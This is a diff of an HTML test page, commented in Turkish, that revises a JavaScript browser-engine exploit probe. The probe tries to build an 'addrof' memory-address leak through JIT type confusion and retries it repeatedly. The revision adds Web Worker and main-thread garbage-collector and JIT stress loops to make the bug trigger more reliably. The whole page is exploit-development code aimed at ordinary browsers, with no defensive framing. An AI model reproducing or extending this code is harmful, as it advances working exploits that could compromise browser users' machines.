@@ -3,66 +3,75 @@
 <h1 id="s">Running...</h1>
 <div id="log" style="font-size:16px"></div>
 <script>
-function log(s) {
-  document.getElementById('log').innerHTML += s + '<br>';
-}
+function log(s){document.getElementById('log').innerHTML+=s+'<br>';}
 
+// WORKER: GC + JIT stress
 var wCode = `
-  function jit(o){return o.a+o.b;}
-  for(var i=0;i<300000;i++) jit({a:1.1,b:2.2});
+  function leak(o){return o.a+o.b+o.c+o.d;}
+  for(var i=0;i<300000;i++) leak({a:1.1,b:2.2,c:3.3,d:4.4});
   while(true){
     var arr=[];
-    for(var i=0;i<10000;i++) arr.push({a:i,b:i+1});
-    jit(arr[0]);
+    for(var i=0;i<10000;i++) arr.push({a:i,b:i+1,c:i+2,d:i+3});
+    leak(arr[0]);
     arr=null;
   }
 `;
 var u=URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
 for(var i=0;i<6;i++) new Worker(u);
 
-// Crash öncesi addrof dene
-function addrof(val) {
-  var arr = [1.1, 2.2, 3.3];
-  function rd(a) { return a[0]; }
+// ANA THREAD: GC stress
+function leak(o){return o.a+o.b+o.c+o.d;}
+for(var i=0;i<300000;i++) leak({a:1.1,b:2.2,c:3.3,d:4.4});
+
+var tick=0;
+function gcStress(){
+  var big=new Array(100000).fill({a:1.1,b:2.2,c:3.3,d:4.4});
+  big.forEach(leak);
+  big=null;
+  tick++;
+  if(tick<200) setTimeout(gcStress,0);
+}
+gcStress();
+
+// ADDROF PROBE: aynı anda çalışıyor
+function addrof(val){
+  var arr=[1.1,2.2,3.3];
+  function rd(a){return a[0];}
   for(var i=0;i<200000;i++) rd([1.1,2.2,3.3]);
-  arr[0] = val;
+  arr[0]=val;
   return rd(arr);
 }
 
-var target = {secret: 0x1337};
-var attempt = 0;
-var gotIt = false;
+var target={secret:0x1337};
+var attempt=0;
+var gotIt=false;
 
-function probe() {
+function probe(){
+  if(gotIt) return;
   attempt++;
-  try {
-    var leaked = addrof(target);
-    var buf = new ArrayBuffer(8);
-    var dv = new DataView(buf);
-    dv.setFloat64(0, leaked, true);
-    var lo = dv.getUint32(0,true);
-    var hi = dv.getUint32(4,true);
-    var isNaN_val = (hi === 0x7ff80000 && lo === 0);
-    
-    if (!isNaN_val) {
-      gotIt = true;
-      document.getElementById('s').textContent = 
-        '✅ attempt '+attempt+': 0x'+hi.toString(16)+lo.toString(16);
+  try{
+    var leaked=addrof(target);
+    var buf=new ArrayBuffer(8);
+    var dv=new DataView(buf);
+    dv.setFloat64(0,leaked,true);
+    var lo=dv.getUint32(0,true);
+    var hi=dv.getUint32(4,true);
+    var isNaN_val=(hi===0x7ff80000&&lo===0);
+
+    if(!isNaN_val){
+      gotIt=true;
+      document.getElementById('s').textContent=
+        '✅ attempt '+attempt+': 0x'+hi.toString(16).padStart(8,'0')+lo.toString(16).padStart(8,'0');
       return;
     }
-    
-    // Her 100 denemede bir log
-    if (attempt % 100 === 0) {
-      log('attempt '+attempt+' — still NaN');
-    }
-    
-    if (!gotIt) setTimeout(probe, 5);
-  } catch(e) {
-    document.getElementById('s').textContent = 'EXCEPTION at attempt '+attempt+': '+e;
+    if(attempt%100===0) log('attempt '+attempt+' — NaN');
+    setTimeout(probe,5);
+  }catch(e){
+    document.getElementById('s').textContent='EXCEPTION attempt '+attempt+': '+e;
   }
 }
 
-// Workers ısınsın, sonra probe başlasın
-setTimeout(probe, 3000);
+// Workers + GC ısınsın sonra probe
+setTimeout(probe,3000);
 </script>
 </body></html>
